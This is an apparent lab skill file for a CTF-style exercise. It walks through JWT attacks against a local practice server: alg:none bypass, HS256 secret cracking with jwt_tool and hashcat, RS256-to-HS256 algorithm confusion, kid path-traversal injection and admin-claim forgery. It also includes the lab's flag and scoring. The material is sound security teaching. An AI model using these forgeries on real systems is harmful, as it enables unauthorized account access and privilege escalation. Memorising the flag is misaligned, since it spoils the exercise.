---
name: analyzing-jwt-token-security
description: >-
  Analyze JSON Web Tokens (JWTs) for common security vulnerabilities including
  algorithm confusion attacks (RS256 to HS256), none algorithm bypass, weak secret
  brute-forcing, and claim manipulation. Practice in isolated lab environments to
  understand authentication bypass and privilege escalation via token forgery.
domain: cybersecurity
subdomain: web-application-testing
tags: [jwt, authentication, algorithm-confusion, web-security, intermediate, token-forgery]
difficulty: intermediate
mitre_techniques: [T1552.001, T1190, T1078]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/jwt-bypass
---

> ⚠️ **Educational Use Only** — JWT manipulation must only be practiced in the provided lab or authorized penetration testing contexts. Forging tokens to access unauthorized accounts or escalate privileges on real systems is illegal and unethical.

## When to Use

- During authorized web application penetration tests when JWTs are used for authentication
- In CTF challenges where the authentication token is a JWT
- When reviewing API security — JWT implementations are frequently misconfigured
- As a prerequisite for understanding OAuth 2.0 security, API authentication bypass, and privilege escalation via token manipulation
- When auditing code that implements JWT verification

## Prerequisites

- **Software:** Docker + Docker Compose, browser or curl
- **Knowledge:** Basic understanding of authentication tokens, base64 encoding, what "signing" means
- **Lab:** `labs/web-application/jwt-bypass` — start with `agentlab start jwt-bypass`
- **Difficulty:** Intermediate
- **Time:** 35–50 minutes

## Workflow

### Step 1: Start the Lab and Obtain a Token

```bash
agentlab start jwt-bypass
# Login as: user / password123
curl -X POST http://localhost:8082/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password123"}'
# Response: {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

### Step 2: Decode and Inspect the JWT

A JWT has three base64-encoded parts separated by dots: `header.payload.signature`

```bash
# Install jwt_tool (pre-installed in lab)
python3 /lab/jwt_tool/jwt_tool.py <token>

# Or manually decode:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiZ3Vlc3QifQ" | base64 -d
# {"username":"user","role":"guest"}
```

Note the `role` claim — the target is to forge a token with `"role":"admin"`.

### Step 3: Attack 1 — None Algorithm Bypass

Some libraries accept `"alg":"none"` and skip signature verification entirely:

```bash
# Craft a token with alg:none
python3 /lab/jwt_tool/jwt_tool.py <token> -X a
# jwt_tool tries the none algorithm attack automatically

# Manual approach:
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"username":"user","role":"admin"}
# Signature: (empty)
# Result: base64(header).base64(payload).
```

Test the forged token:
```bash
curl http://localhost:8082/api/admin \
  -H "Authorization: Bearer <forged-token>"
```

### Step 4: Attack 2 — Weak Secret Brute Force (HS256)

If the secret is weak, it can be brute-forced:

```bash
# Using jwt_tool
python3 /lab/jwt_tool/jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat (mode 16500)
echo "<full-jwt-token>" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# If cracked: secret123
```

Once the secret is found, forge a new token:
```bash
python3 /lab/jwt_tool/jwt_tool.py <token> -T -S hs256 -p "secret123"
# Modify role to admin when prompted
```

### Step 5: Attack 3 — Algorithm Confusion (RS256 → HS256)

When the server uses RS256 (asymmetric), some libraries can be tricked into accepting an HS256 token signed with the server's **public key**:

```bash
# Get the server's public key
curl http://localhost:8082/.well-known/jwks.json

# Use jwt_tool algorithm confusion attack
python3 /lab/jwt_tool/jwt_tool.py <token> -X k -pk /lab/public.pem

# This creates an HS256 token signed with the RSA public key
# Vulnerable servers accept it because they use the public key as the HMAC secret
```

### Step 6: Capture the Flag

Access the admin endpoint with a forged token to retrieve the flag:

```bash
curl http://localhost:8082/api/admin \
  -H "Authorization: Bearer <forged-admin-token>"
# {"flag":"FLAG{jwt_algorithm_confusion_bypassed}","message":"Welcome, admin"}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| JWT | JSON Web Token — base64-encoded header.payload.signature for stateless authentication |
| HS256 | HMAC-SHA256 — symmetric signing algorithm (same key for signing and verification) |
| RS256 | RSA-SHA256 — asymmetric algorithm (private key signs, public key verifies) |
| None Algorithm | JWT algorithm value that disables signature verification — should never be accepted |
| Algorithm Confusion | Tricking the server into verifying RS256 tokens using HS256 with the public key as the secret |
| Claim | Key-value pair in JWT payload (e.g., `"role":"admin"`, `"sub":"user123"`) |
| T1552.001 | MITRE ATT&CK: Credentials from Files |
| T1078 | MITRE ATT&CK: Valid Accounts |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `jwt_tool` | Full JWT attack toolkit — decode, forge, brute-force, algorithm confusion | ✅ Pre-installed |
| `hashcat -m 16500` | HS256 JWT secret brute-force | ✅ Pre-installed |
| `jwt.io` | Web-based JWT decoder/encoder | External (offline lab) |
| `curl` | HTTP request crafting | ✅ Pre-installed |

## Common Scenarios

### Scenario 1: Role Escalation via Claim Modification

JWT payload contains `"role":"user"`. After cracking the weak secret (`secret`):

```python
import jwt
token = jwt.encode({"username": "user", "role": "admin"}, "secret", algorithm="HS256")
```

Access admin endpoints with the forged token.

### Scenario 2: Kid Injection

If the JWT header contains a `kid` (key ID) parameter that's used in a database lookup or file read:

```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```

The server reads `/dev/null` (empty) as the key, making the signature `HMAC(payload, "")` which is trivially forgeable.

### Scenario 3: JWT in URL Parameters

Some APIs pass JWTs in URL parameters (`?token=...`) rather than headers, making them visible in logs and browser history — a data exposure finding separate from the algorithm issues.

## Output / Verification

```bash
agentlab verify jwt-bypass "FLAG{jwt_algorithm_confusion_bypassed}"
```

**Score:** 100 points for none algorithm bypass, 150 for algorithm confusion, 50 bonus for documenting all three attack vectors

## Further Reading

- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- MITRE ATT&CK: [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | [T1078](https://attack.mitre.org/techniques/T1078/)
- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
